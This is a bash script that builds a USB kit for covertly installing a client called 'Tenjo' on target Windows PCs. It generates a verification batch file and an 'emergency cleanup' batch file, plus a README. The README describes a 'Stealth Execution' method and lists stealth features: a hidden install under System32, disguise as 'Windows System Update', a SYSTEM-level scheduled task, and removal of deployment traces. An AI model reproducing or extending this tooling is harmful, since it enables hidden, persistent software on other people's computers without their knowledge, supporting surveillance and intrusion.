#!/bin/bash
# USB Deployment Package Creator
# Creates ready-to-use USB installer

echo "🔧 Creating USB Deployment Package..."

# Create USB deployment structure
USB_DIR="client/usb_deployment"
mkdir -p "$USB_DIR/installer_package"

# Copy latest installer files
echo "📦 Copying installer package..."
if [ -f "client/installer_package.tar.gz" ]; then
    cd "$USB_DIR"
    tar -xzf "../../installer_package.tar.gz" -C installer_package/
    cd ../../
else
    echo "❌ installer_package.tar.gz not found!"
    exit 1
fi

# Create verification script
cat > "$USB_DIR/verify_deployment.bat" << 'EOF'
@echo off
echo Verifying Tenjo deployment...

:: Check if service is running
tasklist /FI "IMAGENAME eq python.exe" 2>NUL | find /I /N "python.exe" >NUL
if "%ERRORLEVEL%"=="0" (
    echo ✅ Tenjo service is running
) else (
    echo ❌ Tenjo service not found
)

:: Check installation directory
if exist "C:\Windows\System32\.tenjo\main.py" (
    echo ✅ Installation files found
) else (
    echo ❌ Installation files missing
)

:: Check scheduled task
schtasks /query /tn "WindowsSystemUpdate" >NUL 2>&1
if "%ERRORLEVEL%"=="0" (
    echo ✅ Startup task configured
) else (
    echo ❌ Startup task missing
)

pause
EOF

# Create cleanup script for emergencies
cat > "$USB_DIR/emergency_cleanup.bat" << 'EOF'
@echo off
:: Emergency cleanup script - removes all Tenjo traces
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)

echo Removing Tenjo installation...

:: Stop processes
taskkill /F /IM python.exe >NUL 2>&1

:: Remove scheduled task
schtasks /delete /tn "WindowsSystemUpdate" /f >NUL 2>&1

:: Remove installation
rmdir /S /Q "C:\Windows\System32\.tenjo" >NUL 2>&1

:: Clean registry (if any)
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSystemUpdate" /f >NUL 2>&1

echo Cleanup completed.
pause
EOF

# Create README for USB deployment
cat > "$USB_DIR/USB_DEPLOYMENT_README.md" << 'EOF'
# USB Deployment Guide for Tenjo

## 📁 Package Contents
- `deploy.bat` - Main deployment script
- `autorun.inf` - Auto-execution configuration  
- `installer_package/` - Tenjo client files
- `verify_deployment.bat` - Post-deployment verification
- `emergency_cleanup.bat` - Emergency removal tool

## 🚀 Deployment Steps

### Method 1: Autorun (if enabled)
1. Insert USB into target PC
2. Windows may auto-prompt to run deployment
3. Click "Yes" or "Run deploy.bat"
4. Wait for "deployment completed successfully"

### Method 2: Manual Execution
1. Insert USB into target PC
2. Open USB drive in File Explorer
3. Right-click `deploy.bat` → "Run as administrator"
4. Wait for completion (window will auto-close)

### Method 3: Stealth Execution
1. Insert USB during normal computer use
2. Open File Manager, navigate to USB
3. Double-click `deploy.bat`
4. Minimize/ignore command window (auto-closes)

## ✅ Verification
Run `verify_deployment.bat` to confirm:
- Service is running
- Files are installed
- Startup task is configured

## 🆘 Emergency Cleanup
If something goes wrong:
- Run `emergency_cleanup.bat` as administrator
- Removes all Tenjo traces from system

## ⏱️ Timing
- Total deployment time: ~30-60 seconds
- No internet connection required
- Works offline completely

## 🔒 Stealth Features  
- Hidden system directory installation
- Disguised as "Windows System Update"
- Scheduled task runs as SYSTEM user
- No visible desktop shortcuts
- Auto-cleanup of deployment traces
EOF

# Calculate package size
PACKAGE_SIZE=$(du -sh "$USB_DIR" | cut -f1)

echo "✅ USB Deployment Package Created!"
echo "📍 Location: $USB_DIR/"
echo "📦 Size: $PACKAGE_SIZE"
echo ""
echo "🎯 Ready for deployment to USB drive"
echo "💾 Copy entire usb_deployment/ folder to USB root"